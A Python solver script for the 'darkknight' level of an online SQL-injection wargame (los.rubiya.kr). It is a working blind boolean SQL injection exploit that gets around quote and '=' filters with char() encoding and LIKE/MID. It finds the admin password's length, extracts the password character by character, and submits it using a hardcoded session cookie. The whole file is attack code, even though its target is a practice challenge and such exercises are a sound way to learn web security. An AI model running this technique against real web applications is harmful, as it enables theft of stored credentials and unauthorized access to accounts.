import requests


def find_password_length(n):
    payload = f"?no=1 or id like char(97,100,109,105,110) and length(pw) like {n}"
    if 'Hello admin' in send_request(payload):
        return n


def find_password(position, char):
    payload = f"?no=1 or id like char(97,100,109,105,110) and MID(pw,{position},1) like char({char})"
    if 'Hello admin' in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    pw = []

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in range(46, 128):
            if find_password(i, char):
                pw.append(chr(char).lower())
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'DARKKNIGHT Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('DARKKNIGHT Clear!')
    else:
        print('Something went wrong!!!')
